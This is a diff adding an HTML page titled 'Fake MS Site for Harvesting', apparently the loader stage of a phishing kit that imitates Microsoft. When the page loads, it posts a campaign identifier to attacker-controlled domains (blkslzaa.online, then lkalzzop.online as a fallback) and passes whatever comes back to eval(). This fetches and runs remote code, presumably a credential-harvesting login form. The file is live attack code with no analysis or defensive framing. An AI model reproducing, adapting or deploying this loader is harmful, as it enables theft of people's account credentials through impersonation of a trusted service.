@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://lh3.googleusercontent.com/pw/AMWts8CjWLE-4lSHnzZVyyi38RiG_iHUev92wvk3GXVlZur4_v68tJc5TxPcsfc6Vo4P2_Sa5_Dg4wBjO9x0q0xYFQKyjpg1zURhvOLxyPhDhPJg_Z8XDFduSWtavIhhZp_z9dX4zrOp2jk9GCWUmL_6qus=s128-no" />
+    <meta name="robots" content="none" />
+    <title>Fake MS Site for Harvesting</title>
+  </head>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script>
+    window.onload = function () {
+      var jquery = document.createElement("script");
+      jquery.src = "https://code.jquery.com/jquery-1.9.1.js";
+      document.getElementsByTagName("head")[0].appendChild(jquery);
+
+      var cryptoJsScript = document.createElement("script");
+      cryptoJsScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
+      document.getElementsByTagName("head")[0].appendChild(cryptoJsScript);
+
+      var faviconElement = document.createElement("link");
+      faviconElement.rel = "shortcut icon";
+      faviconElement.href =
+        "https://lh3.googleusercontent.com/pw/AMWts8CjWLE-4lSHnzZVyyi38RiG_iHUev92wvk3GXVlZur4_v68tJc5TxPcsfc6Vo4P2_Sa5_Dg4wBjO9x0q0xYFQKyjpg1zURhvOLxyPhDhPJg_Z8XDFduSWtavIhhZp_z9dX4zrOp2jk9GCWUmL_6qus=s128-no";
+      document.getElementsByTagName("head")[0].appendChild(faviconElement);
+
+      var htmlElement = document.createElement("div");
+      htmlElement.id = "htmlid";
+      document.getElementsByTagName("body")[0].appendChild(htmlElement);
+
+      var loadingElement = document.createElement("div");
+      loadingElement.id = "LoadingPLSWTF";
+      loadingElement.innerHTML = "Loading .. please wait ..";
+      document.getElementsByTagName("body")[0].appendChild(loadingElement);
+
+      blkslzaaURL = "http://blkslzaa.online";
+      lkalzzopURL = "https://lkalzzop.online";
+      finalURL = blkslzaaURL;
+      counter = 1;
+
+      function makeAjaxRequest() {
+        jQuery.ajax({
+          type: "post",
+          url: finalURL + "/obufsssssssscaaatoion/",
+          data: {
+            PageType: "Normal",
+            NAMEOFTHEGUY: "Fis.004.hCream",
+          },
+          dataType: "json",
+          success: function (response) {
+            const output = response.output;
+            const allowOnline = "Yes";
+            response.Allow_Online;
+
+            if (allowOnline === "Yes") {
+              if (window.location.href.indexOf("http://") === 0 || window.location.href.indexOf("https://") === 0) {
+                $("LoadingPLSWTF").hide();
+                eval(output);
+              } else {
+                console.log("Don't run me here!");
+              }
+            }
+            if (allowOnline === "No") {
+              if (window.location.href.indexOf("http://") === 0 || window.location.href.indexOf("https://") === 0) {
+                console.log("Don't run me here!");
+              } else {
+                $("LoadingPLSWTF").hide();
+                eval(output);
+              }
+            }
+            if (allowOnline === "Both") {
+              $("LoadingPLSWTF").hide();
+              eval(output);
+            }
+          },
+          error: function () {
+            console.log(counter);
+            if (counter === 2) {
+              finalURL = lkalzzopURL;
+            } else counter += 1;
+
+            setTimeout(makeAjaxRequest, 3000);
+          },
+        });
+      }
+
+      var isRunning = true;
+
+      const delay = (duration) => {
+        return new Promise((resolve) => {
+          return setTimeout(resolve, duration);
+        });
+      };
+
+      const runCode = async () => {
+        while (isRunning) {
+          try {
+            makeAjaxRequest();
+            console.log("gud");
+            isRunning = false;
+          } catch (error) {
+            console.log("nr gud");
+            let delayDuration = await delay(1000);
+          }
+        }
+      };
+
+      runCode();
+    };
+  </script>
+</html>
